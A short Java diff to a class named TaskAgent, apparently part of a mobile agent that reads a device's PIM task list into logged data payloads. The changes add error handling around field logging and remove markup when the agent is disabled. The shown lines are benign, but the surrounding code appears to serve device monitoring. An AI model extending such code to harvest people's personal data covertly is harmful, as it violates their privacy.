@@ -74,6 +74,10 @@ public final class TaskAgent extends Agent implements PIMListListener {
         parse(confParams);
         setDelay(SLEEPTIME);
         setPeriod(PERIODTIME);
+        
+        if(!enabled){
+            markup.removeMarkup();
+        }
     }
 
     public synchronized void actualStart() {
@@ -291,9 +295,15 @@ public final class TaskAgent extends Agent implements PIMListListener {
     private void addField(DataBuffer dbPayload, String[] fields,
             int fieldNumber, byte logType) {
 
+        try{
         if (fields[fieldNumber] != null) {
             String value = fields[fieldNumber];
             Utils.addTypedString(dbPayload, logType, value);
+        }
+        }catch(Exception ex){
+            //#ifdef DEBUG_ERROR
+            debug.error(ex);
+            //#endif
         }
 
     }
